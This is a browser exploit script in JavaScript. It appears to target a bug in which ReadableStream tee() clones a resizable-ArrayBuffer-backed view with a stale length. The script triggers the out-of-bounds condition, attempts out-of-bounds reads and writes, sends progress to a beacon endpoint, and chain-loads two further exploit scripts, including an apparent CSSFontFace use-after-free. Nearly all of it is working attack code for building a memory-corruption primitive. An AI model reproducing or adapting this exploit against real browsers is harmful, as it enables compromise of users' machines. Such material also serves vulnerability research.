// p320 - ReadableStream tee() OOB via ResizableArrayBuffer resize
//
// Bug: structuredCloneForStream (StructuredClone.cpp:107-134)
// uses bufferView->lengthRaw() without isOutOfBounds() check.
// When a RAB-backed view is enqueued then the buffer is resized down,
// tee() clones the view with stale length on a smaller cloned buffer.
// wrappedAs() skips verifySubRangeLength for resizable buffers.
//
// Result: cloned TypedArray with length=N on a buffer with byteLength < N*elementSize
//
// Beacon prefix: V320-

(function() {
  var BQ = 0;
  function B(tag) {
    try { new Image().src = '/beacon/V320-' + tag + '?t=' + Date.now() + '&q=' + (BQ++); } catch(e) {}
  }

  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // Feature gates
  try { var _r = new ArrayBuffer(8, {maxByteLength: 64}); } catch(e) { B('NO-RAB'); return; }
  try {
    var _s = new ReadableStream({start: function(c) { c.close(); }});
    B('STREAM-OK');
  } catch(e) { B('NO-STREAM'); return; }

  // Phase 1: Verify tee() exists
  try {
    var ts = new ReadableStream({start: function(c) { c.close(); }});
    var pair = ts.tee();
    B('TEE-OK-' + pair.length);
  } catch(e) {
    B('TEE-ERR-' + e.message.substring(0, 40));
    return;
  }

  // Phase 2: The actual OOB attempt
  var INITIAL_LEN = 1024;  // bytes
  var MAX_LEN = 8192;
  var RESIZE_TO = 8;  // resize down to 8 bytes
  var ELEMENT_SIZE = 8;  // Float64
  var VIEW_ELEMENTS = INITIAL_LEN / ELEMENT_SIZE;  // 128

  var rab = new ArrayBuffer(INITIAL_LEN, {maxByteLength: MAX_LEN});
  var view = new Float64Array(rab);

  // Fill with recognizable pattern
  for (var i = 0; i < VIEW_ELEMENTS; i++) {
    view[i] = 100.0 + i;
  }
  B('P2-FILLED-' + VIEW_ELEMENTS);

  var controller;
  var stream = new ReadableStream({
    start: function(c) {
      controller = c;
    }
  });

  // Enqueue the view
  controller.enqueue(view);
  B('P2-ENQUEUED');

  // Resize the buffer DOWN before tee reads it
  try {
    rab.resize(RESIZE_TO);
    B('P2-RESIZED-' + rab.byteLength);
  } catch(e) {
    B('P2-RESIZE-ERR-' + e.message.substring(0, 40));
  }

  // Verify original view is OOB
  B('P2-ORIG-LEN-' + view.length);
  B('P2-ORIG-BYTELEN-' + view.byteLength);
  B('P2-ORIG-V0-' + view[0]);

  // Tee the stream
  try {
    var branches = stream.tee();
    B('P2-TEED');

    // Read from branch 0
    var reader0 = branches[0].getReader();
    reader0.read().then(function(result) {
      if (result.done) {
        B('P3-BRANCH0-DONE');
        return;
      }

      var chunk = result.value;
      B('P3-TYPE-' + Object.prototype.toString.call(chunk));

      if (chunk instanceof Float64Array) {
        var cLen = chunk.length;
        var cBLen = chunk.byteLength;
        var cBuf = chunk.buffer;
        var cBufLen = cBuf.byteLength;
        var cBufMax = 'unk';
        try { cBufMax = cBuf.maxByteLength; } catch(e) {}

        B('P3-CLONE-LEN-' + cLen);
        B('P3-CLONE-BYTELEN-' + cBLen);
        B('P3-CLONE-BUFLEN-' + cBufLen);
        B('P3-CLONE-BUFMAX-' + cBufMax);

        // Check for OOB condition: view length > buffer bytes / element size
        var maxSafe = Math.floor(cBufLen / ELEMENT_SIZE);
        B('P3-MAXSAFE-' + maxSafe);

        if (cLen > maxSafe) {
          B('P3-OOB-CONFIRMED-' + cLen + '-vs-' + maxSafe);

          // Try to read OOB
          var oobReads = [];
          for (var k = 0; k < Math.min(cLen, 32); k++) {
            try {
              var val = chunk[k];
              if (val !== undefined) {
                oobReads.push(k + ':' + val.toFixed(2));
              } else {
                oobReads.push(k + ':UNDEF');
              }
            } catch(e) {
              oobReads.push(k + ':ERR');
              break;
            }
          }
          B('P3-READS-' + oobReads.slice(0, 10).join('|'));
          if (oobReads.length > 10) {
            B('P3-READS2-' + oobReads.slice(10, 20).join('|'));
          }

          // Try OOB write
          try {
            chunk[maxSafe] = 999.999;
            var readBack = chunk[maxSafe];
            B('P4-WRITE-' + (readBack === 999.999 ? 'OK' : 'FAIL-' + readBack));
          } catch(e) {
            B('P4-WRITE-ERR-' + e.message.substring(0, 30));
          }

          // Try to resize clone buffer larger and re-read
          try {
            cBuf.resize(cLen * ELEMENT_SIZE);
            B('P4-RESIZE-CLONE-' + cBuf.byteLength);

            // After resize, all elements should be accessible
            var postResize = [];
            for (var r = 0; r < Math.min(cLen, 16); r++) {
              var rv = chunk[r];
              if (rv !== undefined) postResize.push(r + ':' + rv.toFixed(2));
              else postResize.push(r + ':UNDEF');
            }
            B('P4-POST-RESIZE-' + postResize.slice(0, 8).join('|'));
          } catch(e) {
            B('P4-RESIZE-ERR-' + e.message.substring(0, 30));
          }

          B('OOB-PRIMITIVE-LIVE');
        } else {
          B('P3-NO-OOB-' + cLen + '-vs-' + maxSafe);
          // Detailed check
          B('P3-V0-' + chunk[0]);
          B('P3-V1-' + chunk[1]);
        }
      } else if (chunk instanceof ArrayBuffer) {
        B('P3-GOT-ARRAYBUFFER-' + chunk.byteLength);
      } else {
        B('P3-UNEXPECTED-' + typeof chunk);
      }

      B('DONE');
    }).catch(function(err) {
      B('P3-READ-ERR-' + err.message.substring(0, 40));
      B('DONE');
    });

    // Also read from branch 1 for comparison
    var reader1 = branches[1].getReader();
    reader1.read().then(function(result) {
      if (result.done) {
        B('P5-BRANCH1-DONE');
        return;
      }
      var chunk1 = result.value;
      if (chunk1 instanceof Float64Array) {
        B('P5-B1-LEN-' + chunk1.length);
        B('P5-B1-BUFLEN-' + chunk1.buffer.byteLength);
      }
    }).catch(function(err) {
      B('P5-B1-ERR-' + err.message.substring(0, 40));
    });

  } catch(e) {
    B('P2-TEE-ERR-' + e.message.substring(0, 40));
  }

  // Timeout safety
  setTimeout(function() { B('TIMEOUT'); B('DONE'); }, 10000);

  // Chain-load p325 ABV inversion + p300 CSSFontFace diagnostic
  setTimeout(function() {
    try {
      var s = document.createElement('script');
      s.src = 'p325-abv-inversion.js?v=325a';
      document.body.appendChild(s);
    } catch(e) {}
  }, 2000);
  setTimeout(function() {
    try {
      var s = document.createElement('script');
      s.src = 'p300-cssfontface-uaf.js?v=300b';
      document.body.appendChild(s);
    } catch(e) {}
  }, 4000);

})();
